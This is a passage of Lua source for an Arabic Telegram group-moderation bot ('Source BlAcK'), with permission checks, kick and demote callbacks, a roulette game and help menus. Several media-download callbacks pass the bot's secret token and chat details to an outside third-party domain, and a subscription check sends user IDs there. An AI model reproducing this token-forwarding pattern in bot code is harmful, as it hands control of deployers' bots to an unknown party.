elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Joker = GetInfo.result.custom_title
else 
Joker = Status
end
end
return Joker
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'᥀︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'᥀︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'᥀︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'᥀︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙حذف الرسائل ↫ '..DEL..'\n᥀︙دعوة المستخدمين ↫ '..INV..'\n᥀︙حظر المستخدمين ↫ '..BAN..'\n᥀︙تثبيت الرسائل ↫ '..PIN..'\n᥀︙تغيير المعلومات ↫ '..EDT..'\n᥀︙اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')
end
end
end
--     Source BlAcK     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Joker = GetInfo.result.bio
else 
Joker = "لا يوجد"
end
end
return Joker
end
--     Source BlAcK     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source BlAcK     --
function Jokermoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevJoker:get(BlAcK..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source BlAcK     --
function SourceCh(msg) 
local url,res = https.request('https://ccccxcc.ml/BlAcK/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.BlAcK ~= true then
Var = false
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في قناة السورس اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="᥀ 𝗗𝗮𝘃𝗶𝗱 : 𝗧𝗲𝗮𝗠 .",url="t.me/BLACK_TEAM_4"}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
end
--     Source BlAcK     --
function ChCheck(msg)
local var = true 
if DevJoker:get(BlAcK.."Joker:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevJoker:get(BlAcK..'Joker:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevJoker:get(BlAcK..'Joker:ChText') then
local ChText = DevJoker:get(BlAcK..'Joker:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevJoker:get(BlAcK.."Joker:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
--     Source BlAcK     --
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevJoker:get(BlAcK..'yes'..data.sender_user_id_) == 'delyes' then
DevJoker:del(BlAcK..'yes'..data.sender_user_id_, 'delyes')
DevJoker:del(BlAcK..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevJoker:get(BlAcK..'no'..data.sender_user_id_) == 'delno' then
DevJoker:del(BlAcK..'yes'..data.sender_user_id_, 'delyes')
DevJoker:del(BlAcK..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source BlAcK     --
if DataText == '/yesdel' and DevJoker:get(BlAcK..'yesdel'..data.sender_user_id_) == 'delyes' then
DevJoker:del(BlAcK..'yesdel'..data.sender_user_id_, 'delyes')
DevJoker:del(BlAcK..'nodel'..data.sender_user_id_, 'delno')
if DevJoker:sismember(BlAcK..'Joker:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevJoker:sismember(BlAcK..'Joker:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevJoker:sismember(BlAcK..'Joker:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevJoker:sismember(BlAcK..'Joker:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevJoker:sismember(BlAcK..'Joker:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevJoker:sismember(BlAcK..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevJoker:sismember(BlAcK..'Joker:Constructor:'..data.chat_id_, data.sender_user_id_) or DevJoker:sismember(BlAcK..'Joker:Managers:'..data.chat_id_, data.sender_user_id_) or DevJoker:sismember(BlAcK..'Joker:Admins:'..data.chat_id_, data.sender_user_id_) or DevJoker:sismember(BlAcK..'Joker:VipMem:'..data.chat_id_, data.sender_user_id_) or DevJoker:sismember(BlAcK..'Joker:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevJoker:sismember(BlAcK..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevJoker:srem(BlAcK..'Joker:Constructor:'..data.chat_id_,data.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..data.chat_id_,data.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..data.chat_id_,data.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..data.chat_id_,data.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevJoker:srem(BlAcK..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevJoker:get(BlAcK.."Joker:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevJoker:del(BlAcK.."Joker:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevJoker:get(BlAcK.."Joker:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n᥀︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"᥀︙بواسطة ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n᥀︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
BlAcK = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevJoker:del(BlAcK.."Joker:NewDev"..data.sender_user_id_)
dofile('BlAcK.lua') 
end
end
if DataText == '/nodel' and DevJoker:get(BlAcK..'nodel'..data.sender_user_id_) == 'delno' then
DevJoker:del(BlAcK..'yesdel'..data.sender_user_id_, 'delyes')
DevJoker:del(BlAcK..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevJoker:get(BlAcK.."Joker:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevJoker:smembers(BlAcK..'Joker:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevJoker:del(BlAcK..'Joker:ListRolet'..data.chat_id_) 
DevJoker:del(BlAcK.."Joker:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevJoker:del(BlAcK..'Joker:ListRolet'..data.chat_id_) 
DevJoker:del(BlAcK.."Joker:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevJoker:del(BlAcK.."Joker:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevJoker:smembers(BlAcK..'Joker:ListRolet'..data.chat_id_) 
local Text = '᥀︙قائمة الاعبين ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n' 
local Textt = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevJoker:sismember(BlAcK..'Joker:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevJoker:srem(BlAcK..'Joker:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:id/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/BlAcK/Api.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vi/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/BlAcK/Api.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:au/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/BlAcK/Api.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)') then
local Url = DataText:match(tonumber(data.sender_user_id_)..'dl:vo/(.*)')
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/BlAcK/Api.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Joker = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙الكلمه ↫ "..Joker.." تم حذفها") 
DevJoker:del(BlAcK..'Joker:Text:GpTexts'..Joker..data.chat_id_)
DevJoker:srem(BlAcK..'Joker:Manager:GpRedod'..data.chat_id_,Joker)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Joker = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevJoker:smembers(BlAcK..'Joker:Text:GpTexts'..Joker..data.chat_id_)
if DevJoker:get(BlAcK..'Joker:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Joker) 
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Joker = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevJoker:get(BlAcK..'Joker:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..Joker) 
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevJoker:del(BlAcK..'Joker:Text:GpTexts'..Joker..data.chat_id_)
DevJoker:del(BlAcK..'Joker:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevJoker:srem(BlAcK..'Joker:Manager:GpRedod'..data.chat_id_,Joker)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local Joker = DataText:match('/HideHelpList:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم اخفاء كليشة الاوامر") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local Joker = DataText:match('/HelpList:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
local Help = DevJoker:get(BlAcK..'Joker:Help')
local Text = [[
᥀︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙م1 ↫ اوامر الحمايه
᥀︙م2 ↫ اوامر الادمنيه
᥀︙م3 ↫ اوامر المدراء
᥀︙م4 ↫ اوامر المنشئين
᥀︙م5 ↫ اوامر المطورين
᥀︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local Joker = DataText:match('/HelpList1:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevJoker:get(BlAcK..'Joker:Help1')
local Text = [[
᥀︙اوامر حماية المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح ↫ الروابط
᥀︙قفل • فتح ↫ المعرفات
᥀︙قفل • فتح ↫ البوتات
᥀︙قفل • فتح ↫ المتحركه
᥀︙قفل • فتح ↫ الملصقات
᥀︙قفل • فتح ↫ الملفات
᥀︙قفل • فتح ↫ الصور
᥀︙قفل • فتح ↫ الفيديو
᥀︙قفل • فتح ↫ الاونلاين
᥀︙قفل • فتح ↫ الدردشه
᥀︙قفل • فتح ↫ التوجيه
᥀︙قفل • فتح ↫ الاغاني
᥀︙قفل • فتح ↫ الصوت
᥀︙قفل • فتح ↫ الجهات
᥀︙قفل • فتح ↫ الماركداون
᥀︙قفل • فتح ↫ التكرار
᥀︙قفل • فتح ↫ الهاشتاك
᥀︙قفل • فتح ↫ التعديل
᥀︙قفل • فتح ↫ التثبيت
᥀︙قفل • فتح ↫ الاشعارات
᥀︙قفل • فتح ↫ الكلايش
᥀︙قفل • فتح ↫ الدخول
᥀︙قفل • فتح ↫ الشبكات
᥀︙قفل • فتح ↫ المواقع
᥀︙قفل • فتح ↫ الفشار
᥀︙قفل • فتح ↫ الكفر
᥀︙قفل • فتح ↫ الطائفيه
᥀︙قفل • فتح ↫ الكل
᥀︙قفل • فتح ↫ العربيه
᥀︙قفل • فتح ↫ الانكليزيه
᥀︙قفل • فتح ↫ الفارسيه
᥀︙قفل • فتح ↫ التفليش
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر حمايه اخرى ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح + الامر ↫ ⤈
᥀︙التكرار بالطرد
᥀︙التكرار بالكتم
᥀︙التكرار بالتقيد
᥀︙الفارسيه بالطرد
᥀︙البوتات بالطرد
᥀︙البوتات بالتقيد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local Joker = DataText:match('/HelpList2:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevJoker:get(BlAcK..'Joker:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
᥀︙تاك للكل 
᥀︙انشاء رابط
᥀︙ضع وصف
᥀︙ضع رابط
᥀︙ضع صوره
᥀︙حذف الرابط
᥀︙كشف البوتات
᥀︙طرد البوتات
᥀︙تنظيف + العدد
᥀︙تنظيف التعديل
᥀︙كللهم + الكلمه
᥀︙اسم البوت + الامر
᥀︙ضع • حذف ↫ ترحيب
᥀︙ضع • حذف ↫ قوانين
᥀︙اضف • حذف ↫ صلاحيه
᥀︙الصلاحيات • حذف الصلاحيات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙ضع سبام + العدد
᥀︙ضع تكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع مميز • تنزيل مميز
᥀︙المميزين • حذف المميزين
᥀︙كشف القيود • رفع القيود
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙حذف • مسح + بالرد
᥀︙منع • الغاء منع
᥀︙قائمه المنع
᥀︙حذف قائمه المنع
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل ↫ الرابط
᥀︙تفعيل • تعطيل ↫ الالعاب
᥀︙تفعيل • تعطيل ↫ الترحيب
᥀︙تفعيل • تعطيل ↫ التاك للكل
᥀︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙طرد المحذوفين
᥀︙طرد ↫ بالرد • بالمعرف • بالايدي
᥀︙كتم • الغاء كتم
᥀︙تقيد • الغاء تقيد
